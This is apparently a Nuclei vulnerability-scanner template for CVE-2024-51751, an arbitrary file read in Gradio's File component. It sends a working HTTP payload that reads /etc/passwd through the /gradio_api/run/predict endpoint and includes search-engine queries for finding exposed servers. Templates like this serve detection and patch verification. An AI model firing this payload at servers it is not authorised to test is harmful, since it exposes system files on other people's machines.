id: CVE-2024-51751

info:
  name: Gradio File Component - Arbitrary File Read
  author: KoYejune0302,gy741
  severity: medium
  description: |
    If File or UploadButton components are used as a part of Gradio application to preview file content, an attacker with access to the application might abuse these components to read arbitrary files from the application server.
  reference:
    - https://github.com/gradio-app/gradio/security/advisories/GHSA-rhm9-gp5p-5248
    - https://nvd.nist.gov/vuln/detail/CVE-2024-51751
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.5
    cve-id: CVE-2024-51751
    cwe-id: CWE-22
  metadata:
    verified: true
    max-request: 2
    shodan-query: html:"__gradio_mode__"
    product: gradio
    vendor: gradio_project
    fofa-query: body="__gradio_mode__"
  tags: cve,cve2024,gradio,lfi

flow: http(1) && http(2)

http:
  # Pre-condition check: Ensure the server returns {"error":null} for a valid request
  - raw:
      - |
        POST /gradio_api/run/predict HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {
          "data": [
            {
              "path": "/tmp/safe_file.txt",
              "orig_name": "safe_file.txt",
              "size": 4,
              "mime_type": "text/plain",
              "meta": {
                "_type": "gradio.FileData"
              }
            }
          ],
          "event_data": null,
          "fn_index": 0,
          "trigger_id": 8,
          "session_hash": "aaaaaaaaaaa"
        }

    matchers:
      - type: word
        part: body
        words:
          - '{"error":null}'
        internal: true

  # Vulnerability check: Attempt to read /etc/passwd without the meta field
  - raw:
      - |
        POST /gradio_api/run/predict HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {
          "data": [
            {
              "path": "/etc/passwd",
              "orig_name": "test.txt",
              "size": 4,
              "mime_type": "text/plain"
            }
          ],
          "event_data": null,
          "fn_index": 0,
          "trigger_id": 8,
          "session_hash": "aaaaaaaaaaa"
        }

    matchers:
      - type: regex
        regex:
          - 'root:.*:0:0:'
